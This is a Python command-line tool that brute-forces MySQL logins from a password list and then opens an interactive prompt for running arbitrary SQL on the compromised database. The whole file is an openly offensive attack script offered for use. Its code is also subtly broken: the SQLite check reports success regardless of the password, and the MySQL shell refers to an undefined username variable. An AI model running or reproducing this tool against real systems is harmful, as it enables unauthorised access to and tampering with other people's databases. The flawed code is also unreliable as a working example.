import argparse
import mysql.connector
import sqlite3
import time
from colorama import Fore, init

# Initialize colorama
init()

def try_mysql(target, username, password):
    try:
        conn = mysql.connector.connect(
            host=target,
            user=username,
            password=password
        )
        conn.close()
        return True
    except mysql.connector.Error as err:
        return False

def try_sqlite(target, username, password):
    try:
        conn = sqlite3.connect(target)
        return True
    except sqlite3.Error as err:
        return False

def bruteforce_sql(target, username, password_list, db_type):
    for password in password_list:
        print(f"{Fore.YELLOW}Trying Passphrase: {password}{Fore.RESET}")
        
        if db_type == "mysql":
            success = try_mysql(target, username, password)
        elif db_type == "sqlite":
            success = try_sqlite(target, username, password)
        else:
            print(f"{Fore.RED}Invalid database type. Please use 'mysql' or 'sqlite'.{Fore.RESET}")
            return

        if success:
            print(f"{Fore.GREEN}KEY FOUND: [{password}]{Fore.RESET}")
            return password
        time.sleep(1)
    
    print(f"{Fore.RED}KEY NOT FOUND{Fore.RESET}")
    return None

def execute_sql_commands(target, db_type):
    print(f"{Fore.CYAN}Connected! You can now execute SQL commands. Type 'exit' to quit.{Fore.RESET}")
    
    if db_type == "mysql":
        conn = mysql.connector.connect(
            host=target,
            user=username,
            password=password
        )
    elif db_type == "sqlite":
        conn = sqlite3.connect(target)
    else:
        print(f"{Fore.RED}Invalid database type. Please use 'mysql' or 'sqlite'.{Fore.RESET}")
        return
    
    cursor = conn.cursor()
    
    while True:
        command = input(f"{Fore.CYAN}SQL Command> {Fore.RESET}")
        if command.lower() == 'exit':
            break
        try:
            cursor.execute(command)
            if db_type == "mysql":
                result = cursor.fetchall()
                for row in result:
                    print(row)
            elif db_type == "sqlite":
                print("Query executed successfully.")
        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}{Fore.RESET}")
    
    conn.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Bruteforcer with execution capabilities.")
    parser.add_argument("-l", "--username", required=True, help="Username for SQL connection")
    parser.add_argument("-P", "--passwordlist", required=True, help="Path to password list file")
    parser.add_argument("target", help="Target IP address or SQLite file path")
    parser.add_argument("-t", "--type", choices=["mysql", "sqlite"], required=True, help="Database type (mysql or sqlite)")

    args = parser.parse_args()

    # Read the password list
    with open(args.passwordlist, "r") as f:
        password_list = [line.strip() for line in f.readlines()]

    # Bruteforce SQL
    password = bruteforce_sql(args.target, args.username, password_list, args.type)
    
    if password:
        execute_sql_commands(args.target, args.type)
